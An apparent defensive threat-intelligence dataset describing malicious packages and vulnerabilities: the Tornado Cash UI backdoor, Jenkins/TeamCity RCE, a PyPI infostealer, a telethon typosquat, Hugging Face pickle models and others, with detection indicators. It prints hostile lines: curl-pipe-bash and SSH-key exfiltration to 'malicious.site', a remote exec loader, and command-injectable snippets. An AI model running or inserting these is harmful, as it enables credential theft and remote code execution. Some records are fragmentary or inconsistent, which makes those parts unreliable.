package_info.why_malicious: A developer inserted malicious JavaScript into the Tornado Cash user interface, which covertly exfiltrated users’ private deposit notes to an external server, enabling theft of funds. This was a supply chain attack targeting users accessing the service via IPFS gateways.

execution_context.trigger: At runtime, when a user performs a deposit or withdrawal action in the Tornado Cash UI
execution_context.file_location: Injected JavaScript code within the Tornado Cash web UI (served via IPFS gateways)
required_permissions: Access to in-browser cryptographic secrets (deposit notes) via UI event handlers

malicious_snippets.code_behavior: At runtime, when a user interacts with the Tornado Cash UI to perform a deposit or withdrawal, the code intercepts the user's private deposit note, encodes it, and sends it via HTTPS POST to an attacker-controlled server, resulting in exfiltration of sensitive cryptographic secrets.

malice_analysis.why_suspicious: The code accesses sensitive cryptographic secrets (deposit notes) from user actions and transmits them to an external, attacker-controlled server, which is not required for legitimate Tornado Cash operations and directly enables theft of user funds.
malice_analysis.violated_expectations: Legitimate Tornado Cash UI code should never transmit private deposit notes or cryptographic secrets off-device; all cryptographic operations and secret handling are expected to remain local to the user's browser. Any network transmission of such secrets is a clear violation of privacy and security expectations.
malice_analysis.similar_legitimate_use: Legitimate telemetry or analytics might send non-sensitive usage data (such as page views or error logs), but never private keys, deposit notes, or any cryptographic secrets. No legitimate use case exists for sending deposit notes to external servers.
key_indicators: Client-side JavaScript code accessing deposit notes or cryptographic secrets during user actions
Outbound HTTPS POST requests to external, non-Tornado Cash domains from the UI
Encoding of sensitive data (e.g., using encodeURIComponent or base64) prior to transmission
Presence of hardcoded external URLs or domains in UI source code not associated with official Tornado Cash infrastructure

attack_chain.action: A malicious developer submits a governance proposal containing backdoored JavaScript code to the Tornado Cash open-source repository.
attack_chain.leads_to: Malicious code is merged and deployed to IPFS gateways.

attack_chain.action: The compromised UI build is served to users via IPFS gateways (e.g., ipfs.io, cf-ipfs.com).
attack_chain.leads_to: Users interact with the malicious UI.

attack_chain.action: When users perform deposit or withdrawal actions, the malicious code captures their private deposit notes.
attack_chain.leads_to: Sensitive deposit notes are exfiltrated to the attacker's server.

attack_chain.action: The attacker collects exfiltrated deposit notes and uses them to withdraw or steal funds from Tornado Cash contracts.
attack_chain.leads_to: Final goal: theft of user funds and compromise of privacy.

behavioral_signatures: Client-side JavaScript accessing cryptographic secrets (deposit notes or private keys) during user deposit or withdrawal actions
Outbound network requests (e.g., HTTPS POST) from the UI to external domains not associated with Tornado Cash during normal user operations
Encoding and transmission of sensitive data (such as deposit notes) in network payloads, especially using encodeURIComponent or base64 encoding
file_indicators: Unexpected or obfuscated JavaScript code present in Tornado Cash UI builds deployed to IPFS
References to external domains or URLs not associated with official Tornado Cash infrastructure within UI source code (e.g., hardcoded attacker domains)
network_indicators: HTTPS POST requests from user browsers running Tornado Cash UI to attacker-controlled domains (not tornado.cash or official infrastructure)
Unusual outbound traffic from IPFS-hosted Tornado Cash UIs to unknown or unlisted endpoints, especially during deposit or withdrawal actions
detection_knowledge.how_to_detect: Monitor Tornado Cash UI builds for unauthorized JavaScript code that accesses deposit notes or cryptographic secrets and transmits them to external servers. Use static and dynamic analysis to flag any code that reads sensitive secrets and initiates network requests to non-official domains. Implement network monitoring to alert on POST requests from Tornado Cash UIs to domains not on the official allowlist. Regularly audit governance proposals and code contributions for hidden or obfuscated data exfiltration logic, and verify that no cryptographic secrets are ever transmitted off-device.

package_info.package_versions: Jenkins: versions vulnerable to CVE-2024-23897; TeamCity: versions vulnerable to CVE-2023-42793
package_info.why_malicious: The vulnerabilities enable remote code execution (RCE) on CI/CD servers, allowing attackers to compromise the build process, inject malicious code, steal sensitive assets such as source code and signing certificates, and subvert the software supply chain, thereby putting downstream consumers at significant risk.

execution_context.trigger: runtime (triggered via exploitation of RCE vulnerability through HTTP API endpoints)
execution_context.file_location: Jenkins core server process (accessed via HTTP API endpoints exploited by attacker)

malicious_snippets.code_snippet: Attacker-supplied payload executed via Jenkins RCE (e.g., curl http://malicious.site/payload.sh | bash)
malicious_snippets.code_behavior: At runtime, after the attacker exploits the RCE vulnerability via a crafted HTTP request, the server executes arbitrary shell commands provided by the attacker, such as downloading and executing a remote payload, resulting in the attacker gaining full control over the CI/CD environment.

malice_analysis.why_suspicious: Execution of attacker-supplied shell commands via HTTP input is highly suspicious, as it allows arbitrary code execution outside of any authorized build or administrative process.
malice_analysis.violated_expectations: CI/CD servers are expected to execute only code defined in trusted build scripts or by authenticated administrators; execution of arbitrary commands from network input is never legitimate.
malice_analysis.similar_legitimate_use: Automated build scripts may download dependencies from trusted sources, but never execute shell commands based on unauthenticated or attacker-controlled HTTP input.
key_indicators: Shell command execution triggered by HTTP request parameters
Network connections initiated to untrusted or external domains from the CI/CD server
Process creation events (e.g., bash, curl) not associated with any known build job

execution_context.trigger: runtime (post-exploitation, used for persistence or data exfiltration after initial compromise)
execution_context.file_location: Injected into build scripts or set in environment variables on the compromised server

malicious_snippets.code_snippet: cat ~/.ssh/id_rsa | curl -X POST http://malicious.site/exfil --data-binary @-
malicious_snippets.code_behavior: After the attacker gains access, the code reads sensitive files such as SSH private keys from the filesystem and transmits their contents via an outbound HTTP POST request to an attacker-controlled domain, resulting in credential exfiltration and enabling further unauthorized access.

malice_analysis.why_suspicious: Reading and exfiltrating private keys or other sensitive files from a build server to an external domain is a clear indicator of malicious activity and data theft.
malice_analysis.violated_expectations: Build scripts and processes should never access or transmit sensitive credentials, such as SSH keys, outside the organization's trusted network.
malice_analysis.similar_legitimate_use: There is no legitimate reason for build scripts to exfiltrate secrets or private keys to external servers; such actions are always suspicious.
key_indicators: Access to sensitive files like ~/.ssh/id_rsa or signing certificates by build processes
Outbound HTTP POST requests to domains not associated with the organization
Use of command-line tools (e.g., curl) to transmit data from sensitive files

execution_context.trigger: runtime (during build pipeline execution, specifically in artifact creation or signing steps)
execution_context.file_location: Injected into build pipeline scripts or directly into the artifact signing process

malicious_snippets.code_snippet: Malicious code injected into compiled artifacts or packages before distribution (e.g., adding a backdoor to a .jar or .exe file)
malicious_snippets.code_language: varies (depends on build target, e.g., Java, Python, etc.)
malicious_snippets.code_behavior: During the build process, the attacker modifies output artifacts by injecting malicious payloads or backdoors into compiled binaries or packages, which are then distributed to downstream consumers, resulting in a supply chain compromise.

malice_analysis.why_suspicious: Unauthorized modification of build artifacts to include malicious code is a hallmark of supply chain attacks and can lead to widespread compromise of downstream systems.
malice_analysis.violated_expectations: Build outputs should be deterministic and match the source code; any unexpected changes or unauthorized modifications to artifacts indicate a compromised build process.
malice_analysis.similar_legitimate_use: Only trusted and documented build steps should modify artifacts; there is no legitimate reason for undocumented or unauthorized code injection into build outputs.
key_indicators: Artifact hash mismatches between source and distributed binaries
Presence of unexpected code or binaries in released packages
Build logs or version control history showing unauthorized file modifications during the build process

attack_chain.action: Attacker exploits Jenkins/TeamCity RCE vulnerability to gain code execution on the CI/CD server by sending crafted HTTP requests.
attack_chain.leads_to: Initial access and full control over the build environment

attack_chain.action: Attacker exfiltrates sensitive files, such as SSH private keys and signing certificates, from the compromised server to an external domain.
attack_chain.leads_to: Credential theft and potential for lateral movement within the organization

attack_chain.action: Attacker injects malicious code or backdoors into build artifacts during the build or signing process, compromising software distributed to downstream consumers.
attack_chain.leads_to: Widespread supply chain compromise affecting downstream users

behavioral_signatures: Execution of shell commands on CI/CD servers triggered by HTTP API input or unexpected network requests
Outbound network connections from build servers to untrusted or attacker-controlled domains
Access to sensitive files (e.g., ~/.ssh/id_rsa, signing keys) by build or server processes outside of normal operations
Modification of build artifacts or output files outside of documented build steps
file_indicators: Build scripts or environment variables containing suspicious shell commands (e.g., curl to external domains, cat of sensitive files)
Artifacts with unexpected changes, such as hash mismatches or presence of unauthorized code
Server or build logs showing execution of commands not present in the source repository or build configuration
network_indicators: Outbound connections from CI/CD servers to domains such as malicious.site or other known attacker infrastructure
Unusual HTTP POST requests from build servers to external IP addresses or domains not associated with the organization
detection_knowledge.how_to_detect: Continuously monitor CI/CD server logs for signs of RCE exploitation, such as execution of unexpected shell commands or network requests to untrusted domains. Implement file integrity monitoring on build scripts and output artifacts to detect unauthorized modifications. Alert on access to sensitive files by build processes and on outbound connections to suspicious endpoints. Regularly audit build environments for unauthorized configuration changes or injected code, and verify artifact integrity using cryptographic hashes.

package_info.why_malicious: The report highlights several Ruby gems with critical vulnerabilities that can be exploited for SQL injection, command injection, remote code execution, and denial of service. These vulnerabilities, if present in a package, allow attackers to execute arbitrary code, escalate privileges, or disrupt service, making affected packages dangerous in production environments.

malicious_snippets.code_snippet: User.where('1=1').limit(params[:limit]).offset(params[:offset])
malicious_snippets.code_behavior: At runtime, the code constructs SQL queries using untrusted :limit and :offset parameters, resulting in direct user input being incorporated into the SQL statement, which can lead to unauthorized data access or manipulation through SQL injection.

malice_analysis.why_suspicious: Directly interpolating user-controlled parameters into SQL queries without sanitization enables SQL injection, allowing attackers to manipulate database queries and access or modify sensitive data.
malice_analysis.violated_expectations: Normal behavior expects parameterized queries or proper sanitization of user input; this code fails to enforce those protections, exposing the application to injection attacks.
malice_analysis.similar_legitimate_use: Legitimate use would involve sanitized or type-checked parameters for pagination, ensuring only valid numeric values are accepted.
key_indicators: Direct use of user input in SQL query construction
Absence of input validation or sanitization for query parameters
Use of params[:limit] and params[:offset] directly in query methods

malicious_snippets.code_snippet: serialize :settings, YAML
malicious_snippets.code_behavior: At runtime, the code deserializes YAML from user-controlled input, allowing attackers to supply crafted YAML payloads that can trigger arbitrary code execution or denial of service via resource exhaustion.

malice_analysis.why_suspicious: Deserializing YAML from untrusted sources can lead to code execution or resource exhaustion, as YAML deserialization in Ruby can instantiate arbitrary objects or execute code embedded in the payload.
malice_analysis.violated_expectations: Normal behavior expects deserialization only from trusted, internal data sources; this code allows user input to be deserialized without validation.
malice_analysis.similar_legitimate_use: Legitimate use would restrict deserialization to trusted, internal data and validate or sanitize any input before processing.
key_indicators: Deserialization of user-controlled YAML input
No input validation or sanitization before deserialization
Use of YAML as a serialization format for user-supplied data

malicious_snippets.code_snippet: message = ENV['message_key']
malicious_snippets.code_behavior: At runtime, the code reads an environment variable and uses its value in application logic without sanitization, which can allow malicious content to be injected or executed if the environment variable is manipulated.

malice_analysis.why_suspicious: Failure to escape or validate environment variable content can lead to injection attacks or unintended behavior, especially if the variable is used in sensitive contexts such as command execution or configuration.
malice_analysis.violated_expectations: Normal behavior expects environment variables to be sanitized or validated before use in sensitive contexts; this code uses the value directly.
malice_analysis.similar_legitimate_use: Legitimate use would sanitize or validate environment variable content before using it in application logic or output.
key_indicators: Direct use of unsanitized environment variable in application logic
No validation or escaping of environment variable content
Potential for injection via environment manipulation

malicious_snippets.code_snippet: system("wkhtmltopdf '#{params[:url]}' output.pdf")
malicious_snippets.code_behavior: At runtime, the code interpolates user-controlled URL parameters directly into a shell command, resulting in the execution of arbitrary shell commands if the input is crafted maliciously, enabling command injection and arbitrary code execution.

malice_analysis.why_suspicious: Interpolating user input into shell commands without sanitization is a classic command injection vector, allowing attackers to execute arbitrary commands on the server.
malice_analysis.violated_expectations: Normal behavior expects user input to be sanitized or passed as arguments to system calls, not directly interpolated into command strings.
malice_analysis.similar_legitimate_use: Legitimate use would use safe argument passing (e.g., array form of system) or input validation to prevent command injection.
key_indicators: Direct interpolation of user input into shell command
No input sanitization or escaping for shell command parameters
Use of system() with user-supplied data

malicious_snippets.code_snippet: bucket = params[:bucket]; process_bucket(bucket)
malicious_snippets.code_behavior: At runtime, the code allows authenticated users to trigger resource-intensive operations by passing unvalidated bucket names, which can lead to denial of service through resource exhaustion or abuse of application logic.

malice_analysis.why_suspicious: Allowing unvalidated user input to control resource allocation or trigger expensive operations can lead to denial of service, as attackers can repeatedly invoke resource-heavy processes.
malice_analysis.violated_expectations: Normal behavior expects input validation and resource limits to prevent abuse; this code lacks such protections.
malice_analysis.similar_legitimate_use: Legitimate use would restrict or rate-limit such operations and validate input to ensure only authorized buckets are processed.
key_indicators: Unvalidated user input controlling resource allocation
No rate limiting or access control on resource-intensive operations
Potential for resource exhaustion via repeated or malicious requests

attack_chain.action: Attacker sends crafted input (such as SQL parameters, YAML payloads, environment variable values, URL parameters, or bucket names) to the vulnerable application endpoint.
attack_chain.leads_to: Malicious input is received and processed by the application.

attack_chain.action: Application processes the input without proper validation or sanitization, passing user-controlled data into sensitive operations such as SQL queries, deserialization, shell commands, or resource allocation.
attack_chain.leads_to: Execution of injected code, commands, or resource-intensive operations.

attack_chain.action: Malicious code is executed, resulting in data exfiltration, remote code execution, or denial of service depending on the exploited vulnerability.
attack_chain.leads_to: Compromise of application integrity, confidentiality, or availability.

behavioral_signatures: Direct interpolation of user input into SQL queries or shell commands
Deserialization of user-controlled YAML or other data formats
Use of unsanitized environment variables in sensitive contexts
Resource-intensive operations triggered by user input without validation or rate limiting
file_indicators: ActiveRecord model files with unsanitized SQL or YAML deserialization (e.g., use of params[:limit], params[:offset], or serialize :settings, YAML)
OmniAuth gem code referencing ENV variables without escaping or validation
PDFKit gem code using system calls with user input (e.g., system("wkhtmltopdf '#{params[:url]}' output.pdf"))
Fat Free CRM code handling buckets without input validation (e.g., process_bucket(params[:bucket]))
network_indicators: Unexpected outbound connections or requests triggered by user input
Abnormal resource usage patterns, such as spikes in CPU or memory usage indicative of DoS attempts
detection_knowledge.how_to_detect: Scan Ruby gem source code for direct use of user input in SQL queries, shell commands, or deserialization routines. Use static analysis tools to flag unsanitized input handling, such as direct use of params in queries or system calls, and YAML deserialization of user input. Monitor application logs for abnormal input patterns, resource usage spikes, or repeated triggering of resource-intensive operations. Employ dynamic analysis to detect exploitation attempts, such as injection payloads or resource exhaustion attacks.

package_info.why_malicious: The package contains heavily obfuscated, multi-stage Python malware embedded in its __init__.py file. Upon installation or import, it automatically executes code that downloads and runs additional payloads from external sources, exfiltrates sensitive data (including browser credentials, cryptocurrency wallets, and messaging app data), captures screenshots, and establishes a persistent backdoor for remote attacker control.

malicious_snippets.code_snippet: Obfuscated Python code in __init__.py that, upon import, downloads and executes a second-stage payload from an external URL (e.g., hxxps[:]//ipfs.io/ipfs/QmQcn1grVAFSazs31pJAcQUjdwVQUY9TtZFHgggFBN6wYQ).
malicious_snippets.code_behavior: At import-time, the code issues an outbound network request to a hardcoded IPFS URL, downloads a remote Python script, writes it to a temporary file, and executes it in the current process context, resulting in arbitrary code execution controlled by the attacker.

malice_analysis.why_suspicious: Automatic remote code execution during import is highly abnormal and enables attackers to run arbitrary code without user consent.
malice_analysis.violated_expectations: Legitimate Python packages do not fetch or execute remote code during import or installation.
malice_analysis.similar_legitimate_use: Some auto-updating mechanisms in standalone applications, but never in library imports or package initializers.
key_indicators: Obfuscated code in __init__.py
Hardcoded external URLs (e.g., ipfs.io)
Network request and execution of downloaded code at import-time
No user interaction required for execution

malicious_snippets.code_snippet: Python code that scans for browser data (passwords, cookies, history, credit cards), cryptocurrency wallets (Exodus, Electrum, Monero), and messaging app data (Telegram, Signal, Session), then compresses and exfiltrates it via Telegram bot API.
malicious_snippets.code_behavior: At runtime, the code enumerates browser, wallet, and messaging app data directories, collects sensitive files, compresses the harvested data into an archive, and transmits the archive to the attacker's Telegram bot using the Telegram API, resulting in large-scale credential and data theft.

malice_analysis.why_suspicious: Harvesting and exfiltrating sensitive user data such as browser credentials and wallet files is a hallmark of information-stealing malware.
malice_analysis.violated_expectations: Legitimate packages do not access, compress, or transmit user secrets or private files without explicit user consent.
malice_analysis.similar_legitimate_use: Enterprise backup or remote support tools, but only with explicit user consent and clear notification.
key_indicators: Access to browser and wallet data directories (e.g., Chrome, Exodus, Electrum paths)
Compression of harvested data into archives
Use of Telegram API for automated data exfiltration
Enumeration of messaging app data directories

malicious_snippets.code_snippet: Python code that captures screenshots of the victim's desktop and sends them to the attacker's Telegram bot.
malicious_snippets.code_behavior: At runtime, the code captures screenshots of the user's desktop environment, saves the images to temporary files, and transmits them to the attacker's Telegram bot via the Telegram API, resulting in unauthorized surveillance and privacy violation.

malice_analysis.why_suspicious: Capturing and exfiltrating screenshots without user knowledge is a clear privacy violation and a common tactic for espionage and surveillance malware.
malice_analysis.violated_expectations: Legitimate packages do not capture or transmit user screenshots without explicit user action and consent.
malice_analysis.similar_legitimate_use: Remote support or monitoring tools, but only with user consent and visible notification.
key_indicators: Screenshot capture code (e.g., use of PIL.ImageGrab or pyautogui.screenshot)
Saving images to temporary files
Network transmission of image files via Telegram API

malicious_snippets.code_snippet: Python code that establishes a persistent backdoor, allowing the attacker to remotely execute commands on the victim's system.
malicious_snippets.code_behavior: At runtime, the code establishes a persistent backdoor by creating a network listener or polling a remote command-and-control server, enabling the attacker to execute arbitrary shell commands on the victim's system and maintain ongoing access across reboots.

malice_analysis.why_suspicious: Backdoor installation provides unauthorized remote access and persistent control, directly compromising system integrity and user security.
malice_analysis.violated_expectations: Legitimate packages do not provide remote shell access or install persistence mechanisms for third-party control.
malice_analysis.similar_legitimate_use: Remote administration tools, but only with explicit user consent, authentication, and security controls.
key_indicators: Code for remote command execution (e.g., os.system, subprocess)
Persistence mechanisms (e.g., autorun registry keys, scheduled tasks, startup folder entries)
Network communication with attacker-controlled servers

package_info.why_malicious: The package is a typosquat of the legitimate 'telethon' package and contains concealed malicious code within a core function. This code retrieves and executes attacker-controlled payloads from an external server, enabling remote code execution on victim systems. The package also employs starjacking by linking to the real telethon GitHub repository to appear legitimate and trustworthy.

execution_context.trigger: At runtime, when the send_message function is invoked by the user or application

malicious_snippets.code_snippet: import base64, requests; exec(base64.b64decode(requests.get('hxxps[:]//tg[.]aliyun-sdk-requests[.]xyz/telegram').text))
malicious_snippets.code_behavior: At runtime, when the send_message function is called, the code issues an outbound HTTP request to a hardcoded attacker-controlled domain, retrieves a base64-encoded payload, decodes it, and executes the resulting code in the current process, resulting in arbitrary remote code execution.

malice_analysis.why_suspicious: The code dynamically fetches and executes code from an untrusted remote server at runtime, which is a hallmark of remote code execution attacks. The use of base64 decoding and exec() further obscures the payload and bypasses static analysis.
malice_analysis.violated_expectations: Legitimate package functions should not download and execute code from external sources, especially within core functions. This violates the expectation of static, reviewable code and introduces severe security risks.
malice_analysis.similar_legitimate_use: Some plugin systems may fetch code or data from trusted, documented sources with explicit user consent, but never from undocumented, untrusted domains or without transparency.
key_indicators: Use of exec() on data fetched from a remote server
Base64 decoding of network-fetched payloads
Outbound HTTP request to a non-standard, attacker-controlled domain
Malicious logic embedded in a core function (send_message)

package_info.why_malicious: The application is intentionally designed to be vulnerable to the OWASP API Top 10 risks, exposing users to critical API security flaws such as Broken Object Level Authorization (BOLA) and Mass Assignment. malicious_snippets.code_behavior: At runtime, when an authenticated user calls the DELETE /api/comments/{comment_id} endpoint, the function immediately deletes the specified comment from the database without verifying that the requesting user is the comment's author, resulting in unauthorized deletion of any comment.

malice_analysis.why_suspicious: The code allows any authenticated user to delete any comment, regardless of ownership, which is a classic Broken Object Level Authorization (BOLA) vulnerability. The ownership check is performed after the deletion, rendering it ineffective.
malice_analysis.violated_expectations: Normal behavior would require a check to ensure only the comment's author (or an admin) can delete the comment before performing the deletion. Here, the authorization logic is either missing or misplaced after the destructive action.
malice_analysis.similar_legitimate_use: Legitimate admin moderation tools may allow comment deletion, but only with explicit privilege checks and typically only for users with elevated permissions.

malice_analysis.violated_expectations: Normal behavior would restrict updates to non-sensitive fields (e.g., email, bio) and never allow users to escalate their own privileges through user-controlled input. Sensitive fields should be filtered or validated server-side.
malice_analysis.similar_legitimate_use: Admin-only endpoints may legitimately update user roles, but such actions should be restricted to privileged users and never exposed via general user profile update APIs.

package_info.why_malicious: The vulnerability enables attackers to hijack the namespace of popular repositories after a username change on GitHub. By recreating a repository under a reclaimed username, attackers can serve malicious code to users and automated systems that depend on the original repository URL. This constitutes a supply chain attack vector capable of poisoning packages and GitHub Actions at scale, leading to widespread compromise.

malicious_snippets.code_snippet: Attacker creates a repository with the same name as the original under a reclaimed username, then pushes malicious code. For example, if the original repository was at github.com/old-username/repo and the owner renames their username, the attacker registers 'old-username', creates 'repo', and pushes code that may contain backdoors, credential stealers, or other malicious payloads.
malicious_snippets.code_language: Any (depends on the original repository's language, e.g., Go, PHP, Swift, YAML for GitHub Actions)
malicious_snippets.code_behavior: When a user or package manager fetches or installs from the hijacked repository URL, the system retrieves attacker-controlled code, which may execute arbitrary logic, exfiltrate data, or introduce supply chain compromise.

malice_analysis.why_suspicious: Recreation of a previously retired repository namespace by a new owner, especially with a different commit history or codebase, is a strong indicator of a supply chain attack. The attacker can introduce malicious code that is automatically trusted by users and systems relying on the original repository URL.
malice_analysis.violated_expectations: Users and automated systems expect the repository URL to always resolve to the original, trusted codebase. RepoJacking breaks this trust by allowing a new, untrusted party to control the namespace and serve arbitrary code, violating the integrity and authenticity of the supply chain.
malice_analysis.similar_legitimate_use: Legitimate repository transfers or username changes may occur, but these are typically accompanied by clear communication and do not involve serving unrelated or malicious code. Legitimate use never involves silently replacing trusted code with attacker-controlled payloads.

malice_analysis.similar_legitimate_use: Some legitimate packages use preinstall for environment validation or setup, but not for launching custom scripts that perform network or process execution actions.

malice_analysis.similar_legitimate_use: Admin endpoints with strict authentication and authorization controls that prevent non-privileged access.
key_indicators: Sensitive administrative functions accessible to non-privileged users
No function-level or method-based access control
Ability to assign privileged roles via API without proper checks

attack_chain.action: Attacker enumerates API endpoints and manipulates object IDs and HTTP methods to test for authorization flaws, such as accessing other tenants' data or invoking admin functions.
attack_chain.leads_to: Unauthorized data access and privilege escalation

attack_chain.action: Attacker performs automated brute force or credential stuffing attacks on the authentication endpoint to gain unauthorized access to user accounts.
attack_chain.leads_to: Account compromise

attack_chain.action: Attacker inspects API responses for excessive data exposure, extracting sensitive information from unfiltered datasets returned by the API.
attack_chain.leads_to: Sensitive data exfiltration

attack_chain.action: Attacker sends API requests with abnormally large pagination or data size parameters to exhaust backend resources and cause denial-of-service.
attack_chain.leads_to: Service disruption

behavioral_signatures: API requests with manipulated object IDs or parameters accessing resources outside the user's scope
High-frequency or repeated authentication attempts from a single IP or user account
API responses containing full datasets or sensitive records not scoped to the requesting user
Requests with excessively large 'size', 'limit', or pagination parameters
Non-privileged users invoking sensitive or administrative API functions via method or parameter manipulation
file_indicators: API endpoints lacking object-level or function-level authorization checks
Endpoints returning unfiltered datasets regardless of user role or permissions
Endpoints with no rate limiting, resource constraints, or input validation on parameters
network_indicators: Bursts of login attempts to /api/auth/login from the same IP or user
API requests with unusually large 'size' or 'limit' parameters in query strings
Requests to admin or sensitive endpoints (e.g., /api/invites/new) from non-admin users
detection_knowledge.how_to_detect: Continuously monitor API logs for patterns such as object ID or parameter manipulation, excessive data in responses, and method changes (e.g., GET to POST). Implement and alert on rate limiting violations and high-frequency authentication attempts. Flag requests with abnormally large parameters or non-privileged users accessing admin endpoints. Regularly audit API endpoints for missing authorization and data exposure controls, and correlate network activity with endpoint access patterns to identify abuse.

package_info.package_name: huggingface-hub (malicious model repositories: dortucx/evil_model, dortucx/nogoodfastai2, dortucx/gpt2-nm, dortucx/eviallenlp, dortucx/badbertopic, etc.)
package_info.package_versions: All versions supporting legacy model loading (notably with tf-keras, torch.load, and pickle-based loaders)
package_info.why_malicious: The packages and model repositories are malicious because they contain serialized model files (TF1 Keras, PyTorch, Pickle) intentionally crafted to execute arbitrary code upon loading. The ecosystem's reliance on unsafe deserialization methods (torch.load, pickle.load, legacy Keras) allows attackers to upload models that trigger code execution on any user who loads them, leading to remote code execution (RCE) and compromise of the user's environment. This threat is exacerbated by the lack of integrity verification and the prevalence of unsafe loading defaults.

execution_context.file_location: huggingface_hub.from_pretrained_keras (legacy TF1 Keras model file, e.g., saved_model.pb)

malicious_snippets.code_snippet: Malicious code embedded in a legacy TF1 Keras model file (e.g., saved_model.pb) that executes upon deserialization.
malicious_snippets.code_behavior: At model load time, the deserialization of the legacy TF1 Keras model file triggers execution of embedded Python code, resulting in arbitrary code execution on the host system.

malice_analysis.why_suspicious: Deserializing untrusted model files with legacy Keras enables arbitrary code execution, exploiting a classic deserialization vulnerability where attacker-supplied code is executed during model reconstruction.
malice_analysis.violated_expectations: Normal model loading should only reconstruct model weights and architecture, not execute arbitrary code or system commands.
malice_analysis.similar_legitimate_use: Custom objects or layers in trusted, internal environments (with strict controls and code review) may require code execution during deserialization, but never from untrusted sources.
key_indicators: Legacy Keras model format (TF1) with embedded code objects
Use of from_pretrained_keras or KerasModelHubMixin.from_pretrained on untrusted files
Absence of integrity verification or warning when loading external models

malicious_snippets.code_snippet: Malicious code embedded in a Pickle file (e.g., exported FastAI learner) that executes upon unpickling.
malicious_snippets.code_behavior: At model load time, the unpickling of the FastAI model file executes attacker-controlled Python code, resulting in arbitrary code execution on the victim's machine.

malice_analysis.why_suspicious: Pickle deserialization of untrusted files is a well-known vector for arbitrary code execution, as Pickle can instantiate and execute arbitrary Python objects and code.
malice_analysis.violated_expectations: Model loading should not execute arbitrary code from the model file; it should only reconstruct model parameters and architecture.
malice_analysis.similar_legitimate_use: Pickle is used for serializing trusted objects in secure, internal workflows where all code and data are controlled.
key_indicators: Pickle file present in model repository
No digital signature or integrity check on model file
Direct use of pickle.load or torch.load on files from untrusted or public sources

Deserialization of legacy Keras, Pickle, or PyTorch files from remote repositories without integrity verification

detection_knowledge.how_to_detect: Monitor for the use of model loading functions (e.g., torch.load, from_pretrained_keras, from_pretrained_fastai, etc.) on files sourced from untrusted or public Hugging Face repositories. Flag any deserialization of legacy Keras, Pickle, or PyTorch files that are not signed or verified. Alert on the presence of both SafeTensors and .bin files in the same repository, especially if the .bin file is loaded after SafeTensors fails. Monitor for unexpected subprocess creation or network activity during model loading. Enforce allowlists for trusted model sources and block or sandbox deserialization of untrusted model files.

package_info.why_malicious: The affected versions of Drupal Core contain a critical DOM-based Cross-Site Scripting (DOM XSS) vulnerability (CVE-2020-13663) and a Cross Site Request Forgery (CSRF) vulnerability (CVE-2020-13663), which allow attackers to inject and execute arbitrary JavaScript in the context of the site or perform unauthorized actions as authenticated users, potentially leading to full site compromise.

execution_context.trigger: runtime (user interaction with web forms or DOM elements)
execution_context.file_location: Drupal Core JavaScript handling user-supplied data in the DOM (exact file not disclosed)

malicious_snippets.code_behavior: At runtime, when a user interacts with web forms or DOM elements, the code assigns unsanitized user input directly to innerHTML of a DOM element, resulting in attacker-controlled data being rendered and executed as JavaScript in the browser.

malice_analysis.why_suspicious: Directly assigning user input to innerHTML without sanitization enables attackers to inject malicious scripts, a well-known vector for DOM-based XSS attacks.
malice_analysis.violated_expectations: Expected behavior is to sanitize or encode user input before inserting it into the DOM to prevent script execution; the actual behavior omits this, allowing arbitrary code execution.
malice_analysis.similar_legitimate_use: Legitimate code may dynamically update DOM elements with user data, but only after proper sanitization or encoding to prevent XSS.
key_indicators: Assignment of user-supplied data to innerHTML or similar DOM APIs without sanitization
Absence of input validation or encoding functions
Direct DOM manipulation with untrusted data
Potential for execution of attacker-supplied JavaScript

execution_context.file_location: Drupal Core Form API (PHP backend, exact file not disclosed)

malicious_snippets.code_snippet:
// Example (not actual code, as technical details are withheld):
$form['#action'] = $_GET['malicious_url']; // No CSRF token validation
malicious_snippets.code_behavior: At runtime, when a form is submitted via the browser, the code processes form input from cross-site requests without verifying a CSRF token, allowing attackers to submit forged requests and perform actions as authenticated users.

malice_analysis.why_suspicious: Processing form submissions without CSRF token validation exposes the application to cross-site request forgery, enabling attackers to perform unauthorized actions on behalf of users.
malice_analysis.violated_expectations: Normal secure implementations require CSRF tokens to be validated for sensitive form actions; the actual code omits this, making the application vulnerable to CSRF attacks.
malice_analysis.similar_legitimate_use: Legitimate form handling includes CSRF token checks to ensure requests originate from trusted sources.
key_indicators: Form actions or endpoints that accept requests without CSRF token validation
Ability to modify form action URLs via GET/POST parameters
Lack of server-side verification for CSRF tokens
Susceptibility to cross-site request forgery attacks

attack_chain.action: Attacker crafts malicious input, such as a JavaScript payload for XSS or a forged form submission for CSRF, and delivers it to the victim via a link, form, or external site.
attack_chain.leads_to: Malicious code is executed in the victim's browser or unauthorized actions are performed on their behalf.

attack_chain.action: Malicious JavaScript executes in the context of the Drupal site due to the DOM XSS vulnerability, enabling the attacker to steal session cookies, escalate privileges, or modify site content.
attack_chain.leads_to: Attacker gains administrator access or exfiltrates sensitive data from the site.

attack_chain.action: CSRF vulnerability allows the attacker to perform unauthorized actions as the victim, such as changing site settings or creating new administrator accounts.
attack_chain.leads_to: Full site compromise or installation of a persistent backdoor.

behavioral_signatures: Insertion of unsanitized user input into the DOM via innerHTML or similar APIs
Form submissions processed without CSRF token validation
Unexpected JavaScript execution within Drupal administrative or user pages
file_indicators: JavaScript files in Drupal Core or custom modules that assign user input to innerHTML or similar DOM properties without sanitization
PHP files in the Form API or related modules that process form submissions without checking for CSRF tokens
network_indicators: POST or GET requests to administrative endpoints lacking CSRF tokens in the payload
Requests to sensitive endpoints with referrers from external domains or missing expected CSRF headers
detection_knowledge.how_to_detect: Audit JavaScript and PHP code for direct insertion of user input into the DOM or form processing logic without CSRF token validation. Monitor web traffic for requests to sensitive endpoints that lack CSRF tokens or originate from untrusted referrers. Use web application firewalls (WAFs) to block common XSS and CSRF attack patterns, and review server logs for suspicious admin actions performed without proper CSRF protection.

package_info.why_malicious: The package contains vulnerabilities that allow attackers to cause denial-of-service (DoS) by flooding the function router cache and to invoke unintended internal functions, potentially leading to remote code execution (RCE) or unauthorized configuration changes. These behaviors are not expected in normal operation and can be exploited by manipulating HTTP endpoints and payloads, exposing critical application internals to remote attackers.

malicious_snippets.code_snippet: String[] functionNames = StringUtils.delimitedListToStringArray(functionDefinition.replaceAll(",", "|"), "|").trim();
malicious_snippets.code_behavior: At runtime, after an HTTP function invocation, the code splits the function name string by ',' or '|', processes the resulting array, and registers each permutation in the function router cache, resulting in unbounded cache growth and memory exhaustion.

